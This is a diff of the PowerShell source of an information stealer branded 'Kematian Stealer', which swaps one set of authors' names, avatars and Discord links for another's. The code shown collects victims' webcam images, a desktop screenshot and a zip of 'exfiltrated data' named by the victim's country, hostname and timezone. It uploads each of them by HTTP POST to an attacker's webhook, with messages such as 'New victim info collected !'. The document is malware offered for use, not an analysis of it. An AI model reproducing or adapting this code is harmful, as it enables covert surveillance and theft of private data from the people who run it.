@@ -14,7 +14,7 @@ else {
     $ProgressPreference = 'SilentlyContinue'
 }
 
-$avatar = "https://cdn.discordapp.com/attachments/1234682061672026122/1252413869830311946/vv.gif?ex=667220cf&is=6670cf4f&hm=3d121cf7213c41df3a92d3f8db0d4d67a5e6aa901d98bf5c42a36a6e75facf89&"
+$avatar = "https://i.imgur.com/DOIYOtp.gif"
 
 
 # Load WPF assemblies
@@ -1224,21 +1224,21 @@ function Backup-Data {
 
     Write-Host "[!] Uploading the extracted data" -ForegroundColor Green
     $embed_and_body = @{
-        "username"   = "KinGSaHm"
-        "color"      = "1705570"
-        "avatar_url" = "https://cdn.discordapp.com/attachments/1234682061672026122/1252413869830311946/vv.gif?ex=667220cf&is=6670cf4f&hm=3d121cf7213c41df3a92d3f8db0d4d67a5e6aa901d98bf5c42a36a6e75facf89&"
-        "url"        = "https://discord.com/invite/ghr"
+        "username"   = "Kematian"
+        "color"      = "15105570"
+        "avatar_url" = "https://i.imgur.com/6w6qWCB.jpeg"
+        "url"        = "https://discord.com/invite/WJCNUpxnrE"
         "embeds"     = @(
             @{
-                "title"       = "victims x Sahm"
-                "url"         = "https://discord.com/invite/ghr"
-                "description" = "Nothing New with Sahm"
-                "color"       = "1705570"
+                "title"       = "Kematian Stealer"
+                "url"         = "https://github.com/Somali-Devs/Kematian-Stealer"
+                "description" = "New victim info collected !"
+                "color"       = "15105570"
                 "footer"      = @{
-                    "text" = "Made by Sahm, KinGBlaCkHaMmER"
+                    "text" = "Made by Kdot, Chainski and EvilByteCode"
                 }
                 "thumbnail"   = @{
-                    "url" = "https://cdn.discordapp.com/attachments/1234682061672026122/1252413869830311946/vv.gif?ex=667220cf&is=6670cf4f&hm=3d121cf7213c41df3a92d3f8db0d4d67a5e6aa901d98bf5c42a36a6e75facf89&"
+                    "url" = "https://i.imgur.com/6w6qWCB.jpeg"
                 }
                 "fields"      = @(
                     @{
@@ -1284,7 +1284,7 @@ function Backup-Data {
     $jpegfiles = Get-ChildItem -Path $folder_general -Filter out*.jpg
     foreach ($jpegfile in $jpegfiles) {
         $name = $jpegfile.Name
-        $messageContent = @{content = "## :camera: Webcam" ; username = "SahmKing" ; avatar_url = $avatar } | ConvertTo-Json; $httpClient = [Net.Http.HttpClient]::new()
+        $messageContent = @{content = "## :camera: Webcam" ; username = "Kematian" ; avatar_url = $avatar } | ConvertTo-Json; $httpClient = [Net.Http.HttpClient]::new()
         $multipartContent = [Net.Http.MultipartFormDataContent]::new()
         $messageBytes = [Text.Encoding]::UTF8.GetBytes($messageContent); $messageContentStream = [IO.MemoryStream]::new()
         $messageContentStream.Write($messageBytes, 0, $messageBytes.Length); $messageContentStream.Position = 0; $streamContent = [Net.Http.StreamContent]::new($messageContentStream)
@@ -1295,7 +1295,7 @@ function Backup-Data {
     }
 
     # Send screenshot
-    $messageContent = @{content = "## :desktop: Screenshot"; username = "SahmKing" ; avatar_url = $avatar } | ConvertTo-Json
+    $messageContent = @{content = "## :desktop: Screenshot"; username = "Kematian" ; avatar_url = $avatar } | ConvertTo-Json
     $httpClient = [Net.Http.HttpClient]::new(); $multipartContent = [Net.Http.MultipartFormDataContent]::new()
     $messageBytes = [Text.Encoding]::UTF8.GetBytes($messageContent); $messageContentStream = [IO.MemoryStream]::new()
     $messageContentStream.Write($messageBytes, 0, $messageBytes.Length); $messageContentStream.Position = 0
@@ -1306,9 +1306,9 @@ function Backup-Data {
     $multipartContent.Add($fileContent, "file", "screenshot.png"); $httpClient.PostAsync($webhook, $multipartContent).Result
 
     # Send exfiltrated data
-    $zipFileName = "$countrycode-($hostname)-Sahm.zip"
+    $zipFileName = "$countrycode-($hostname)-($filedate)-($timezoneString).zip"
     $zipFilePath = "$env:LOCALAPPDATA\Temp\$zipFileName"; Compress-Archive -Path "$folder_general" -DestinationPath "$zipFilePath" -Force
-    $messageContent = @{username = "SahmKing" ; avatar_url = $avatar } | ConvertTo-Json
+    $messageContent = @{username = "Kematian" ; avatar_url = $avatar } | ConvertTo-Json
     $httpClient = [Net.Http.HttpClient]::new(); $multipartContent = [Net.Http.MultipartFormDataContent]::new(); $messageBytes = [Text.Encoding]::UTF8.GetBytes($messageContent)
     $messageContentStream = [IO.MemoryStream]::new(); $messageContentStream.Write($messageBytes, 0, $messageBytes.Length); $messageContentStream.Position = 0
     $streamContent = [Net.Http.StreamContent]::new($messageContentStream); $streamContent.Headers.ContentType = [Net.Http.Headers.MediaTypeHeaderValue]::Parse("application/json")
